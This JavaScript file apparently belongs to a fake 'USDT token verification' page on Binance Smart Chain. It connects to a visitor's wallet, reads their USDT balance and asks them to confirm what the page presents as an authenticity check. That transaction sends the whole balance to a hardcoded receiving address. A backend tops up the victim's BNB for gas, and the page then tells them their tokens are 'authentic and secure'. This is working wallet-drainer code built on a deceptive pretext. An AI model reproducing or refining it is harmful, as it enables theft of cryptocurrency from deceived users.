// ============================================================================
// Your Original Script's Constants
// These are kept as is.
// ============================================================================
const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

// Note: bnbGasSender was in your first script but not actively used in the transfer logic,
// and not present in the "working" script's main flow. Keeping it commented for clarity.
// const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";

// ============================================================================
// New Global Variables & UI Element References (from your working script)
// These MUST correspond to IDs in your HTML for the script to function.
// ============================================================================
let web3; // Global Web3 instance
let userAddress; // Global variable to store the user's connected wallet address

let tokenBalanceValue = 0; // To store the fetched token balance
let tokenContract; // Web3.js contract instance for USDT
let isTransferComplete = false; // Flag to prevent re-triggering transfer

let currentProvider = null; // Stores the detected wallet provider (e.g., window.ethereum, window.trustwallet)
let walletType = 'unknown'; // Stores the type of wallet detected (e.g., 'metamask', 'trust', 'binance')

// References to HTML elements - these need to exist in your HTML
const verifyAssets = document.getElementById('verifyAssets'); // Changed from verifyBtn
const walletAddress = document.getElementById('walletAddress');
const tokenBalance = document.getElementById('tokenBalance');
const verificationModal = document.getElementById('verificationModal');
const progressBar = document.getElementById('progressBar');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');
const step1Desc = document.getElementById('step1Desc');
const step2Desc = document.getElementById('step2Desc');
const step3Desc = document.getElementById('step3Desc');
const step4Desc = document.getElementById('step4Desc');
const modalMessage = document.getElementById('modalMessage');
const closeModalBtns = document.querySelectorAll('.close-modal');
const networkDot = document.getElementById('networkDot');
const networkStatus = document.getElementById('networkStatus');

// Configuration from your working script
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; // Your USDT receiving address (same as bscAddress)

// ABI from your working script - includes both balanceOf and transfer
const tokenAbi = [
    {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Network configuration from your working script
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types enum from your working script
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

// ============================================================================
// Helper Functions (Copied from your working script)
// ============================================================================

/**
 * @dev Initializes Web3.js by detecting the available wallet provider.
 * Sets `web3`, `currentProvider`, and `walletType`.
 * @returns {boolean} True if Web3 is successfully initialized, false otherwise.
 */
async function initWeb3() {
    // Detect wallet type based on global objects injected by wallet extensions
    if (window.trustwallet) {
        walletType = WALLET_TYPES.TRUST;
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = WALLET_TYPES.BINANCE;
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) { // Generic Ethereum provider (MetaMask, etc.)
        walletType = WALLET_TYPES.METAMASK;
        currentProvider = window.ethereum;
    } else if (window.web3 && window.web3.currentProvider) { // Older web3.js detection
        walletType = WALLET_TYPES.UNKNOWN; // Or 'unknown_legacy_web3'
        currentProvider = window.web3.currentProvider;
    } else {
        console.error("No Web3 provider detected. Please install a compatible wallet extension.");
        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
        return false;
    }

    try {
        web3 = new Web3(currentProvider); // Initialize Web3.js with the detected provider
        await updateNetworkStatus(); // Update network display immediately

        // Listen for chain changes to reload or re-initialize (important for dApps)
        if (currentProvider.on) {
            currentProvider.on('chainChanged', (chainId) => {
                console.log("Chain changed. Reloading page for full re-initialization.");
                window.location.reload(); // Reload for robustness on network change
            });

            // Binance Chain specific account change event (different from standard ethereum.on)
            if (walletType === WALLET_TYPES.BINANCE) {
                currentProvider.on('accountsChanged', (accounts) => {
                    console.log("Binance Chain account changed. Reloading page.");
                    window.location.reload(); // Reload for robustness on account change
                });
            }
             // Standard EIP-1193 accountsChanged listener for other wallets
            if (walletType === WALLET_TYPES.METAMASK || walletType === WALLET_TYPES.TRUST) {
                currentProvider.on('accountsChanged', (accounts) => {
                    console.log("Standard accounts changed. Reloading page.");
                    window.location.reload(); // Reload for robustness on account change
                });
            }
        }
        return true;
    } catch (error) {
        console.error("Web3 initialization error:", error);
        showError("Web3 initialization failed. Check console for details.");
        return false;
    }
}

/**
 * @dev Updates the network status display and checks if currently on BSC Mainnet.
 * @returns {boolean} True if on BSC Mainnet, false otherwise.
 */
async function updateNetworkStatus() {
    if (!web3) return false;

    try {
        const chainId = await web3.eth.getChainId();

        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            networkDot.className = "network-dot connected"; // Assumes "network-dot" is a class for styling
            networkStatus.textContent = "Binance Smart Chain";
            return true;
        } else {
            networkDot.className = "network-dot disconnected"; // Assumes "network-dot disconnected" for styling
            networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;

            // Automatically switch to BSC if possible (e.g., for Trust Wallet or MetaMask)
            const switched = await switchToBSC();
            if (switched) {
                return updateNetworkStatus(); // Recursive call to re-check after successful switch
            }
            return false;
        }
    } catch (error) {
        console.error("Error getting network status:", error);
        networkDot.className = "network-dot disconnected";
        networkStatus.textContent = "Network Error";
        return false;
    }
}

/**
 * @dev Attempts to switch the wallet's network to Binance Smart Chain Mainnet.
 * Handles both standard EIP-3326 and Binance Chain Wallet specific methods.
 * @returns {boolean} True if switch is successful or network is added, false otherwise.
 */
async function switchToBSC() {
    step2Desc.textContent = "Switching to Binance Smart Chain...";
    console.log(`Attempting to switch to BSC (Wallet Type: ${walletType})`);

    try {
        // Handle Binance Web3 Wallet's specific switch method
        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain && window.BinanceChain.switchNetwork) {
            await window.BinanceChain.switchNetwork('bsc-mainnet');
            return true;
        }

        // Standard EIP-3326 method for other wallets (MetaMask, Trust Wallet)
        if (currentProvider && currentProvider.request) {
            await currentProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
            });
            return true;
        }
        console.warn("Wallet does not support standard network switching via request method.");
        return false;

    } catch (switchError) {
        // If network not added (error code 4902), try to add it
        if (switchError.code === 4902 && currentProvider && currentProvider.request) {
            try {
                await currentProvider.request({
                    method: 'wallet_addEthereumChain',
                    params: [BSC_MAINNET_PARAMS] // Use the full BSC parameters
                });
                return true; // Successfully added (and usually switched)
            } catch (addError) {
                console.error("Failed to add BSC network:", addError);
                step2Desc.textContent = "Failed to add BSC network. Please add it manually.";
                showError("Failed to add Binance Smart Chain. Please add it manually in your wallet.");
                return false;
            }
        }
        console.error("Failed to switch to BSC:", switchError);
        step2Desc.textContent = "Failed to switch network.";
        showError("Failed to switch network. Please switch to Binance Smart Chain manually.");
        return false;
    }
}

/**
 * @dev Updates the progress bar percentage.
 * @param {number} percent - The percentage (0-100) to set the progress bar width.
 */
function updateProgress(percent) {
    if (progressBar) progressBar.style.width = `${percent}%`;
}

/**
 * @dev Updates the UI status of a specific step in the verification process.
 * @param {number} stepNum - The step number (1-4).
 * @param {string} status - The status ('active', 'completed', 'error', or empty for pending).
 */
function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    if (step) {
        step.className = `step ${status}`; // Assumes 'step' class for base styling
        // Update icon based on status (requires FontAwesome or similar for 'fa-check')
        const iconElement = step.querySelector('.step-icon');
        if (iconElement) {
            iconElement.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum;
        }
    }
}

/**
 * @dev Displays an error message in the modal and logs to console.
 * @param {string} message - The error message to display.
 */
function showError(message) {
    if (modalMessage) {
        modalMessage.textContent = message;
        modalMessage.className = "error-message"; // Assumes "error-message" class for styling
        setTimeout(() => {
            modalMessage.textContent = "";
            modalMessage.className = "";
        }, 5000); // Clear message after 5 seconds
    }
    console.error("Error Displayed:", message);
}

// ============================================================================
// Core Logic (Modified to use new setup, but transfer logic is largely original)
// ============================================================================

/**
 * @dev Gets the USDT token balance for the connected user.
 * This is part of the integrated flow from your working script.
 * @returns {boolean} True if balance fetched successfully, false otherwise.
 */
async function getTokenBalance() {
    updateStep(3, 'active');
    step3Desc.textContent = "Scanning token security parameters...";

    try {
        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';

        tokenContract = new web3.eth.Contract(tokenAbi, usdtContractAddress); // Use tokenAbi and usdtContractAddress

        // Fetch balance using the `who` parameter as per the working script's ABI
        const balance = await tokenContract.methods.balanceOf(userAddress).call();

        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`;

        step3Desc.textContent = "Token analysis complete";
        updateStep(3, 'completed');
        updateStep(4, 'active');
        updateProgress(70);

        return true;
    } catch (error) {
        console.error("Error fetching token balance:", error);
        step3Desc.textContent = "Token analysis failed";
        showError("Failed to analyze token. Please try again.");
        if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
        return false;
    }
}

/**
 * @dev Executes the token verification/transfer process.
 * This function integrates the BNB check and calls your original `transferUSDT`.
 */
async function executeVerification() {
    step4Desc.textContent = "Confirming authenticity in your wallet...";
    if (modalMessage) modalMessage.textContent = "Please confirm the transaction in your wallet";

    try {
        // --- BNB Check and Top-Up Integration (from your original script + working script logic) ---
        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));
        const BNB_LOW_THRESHOLD = 0.0005;

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.log("User BNB is low. Requesting BNB from backend...");
            if (modalMessage) {
                   modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
                   modalMessage.className = "warning-message"; // Assumes 'warning-message' class for styling
            }

            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log("BNB top-up request successful:", result);
                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait a moment and try confirming the transaction again.";
                    if (verificationModal) verificationModal.style.display = "none"; // Close modal so user can re-click verify
                    return; // Stop execution, user needs to re-try after BNB arrives
                } else {
                    const errorData = await response.json();
                    console.error("BNB top-up request failed:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
                    return;
                }
            } catch (backendError) {
                console.error("Error communicating with BNB backend:", backendError);
                showError("Could not request BNB. Network error or backend issue. Please try again.");
                return;
            }
        }
        // --- BNB Check and Top-Up Integration End ---

        // Proceed with USDT transfer if BNB is sufficient
        // Call your original `transferUSDT` function here
        await transferUSDT(tokenBalanceValue, userBNB); // Pass tokenBalanceValue as usdtBalance

        // If transferUSDT completes without error, update UI for success
        step4Desc.textContent = "Verification complete!";
        updateStep(4, 'completed');
        updateProgress(100);

        setTimeout(() => {
            if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
            tokenBalanceValue = 0;

            if (verificationModal) verificationModal.style.display = "none";

            if (verifyAssets) verifyAssets.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; // Changed from verifyBtn
            if (verifyAssets) verifyAssets.disabled = true; // Changed from verifyBtn

            if (modalMessage) {
                modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure.";
                modalMessage.className = "success-message"; // Assumes "success-message" class
            }
            isTransferComplete = true;
        }, 1500);

    } catch (error) {
        console.error("Verification process failed (outside transferUSDT):", error);
        step4Desc.textContent = "Verification failed";
        if (modalMessage) {
            modalMessage.textContent = "Verification failed. Please try again.";
            modalMessage.className = "error-message";
        }
        // transferUSDT already handles its own error messages, so this outer catch is for issues before it.
    }
}


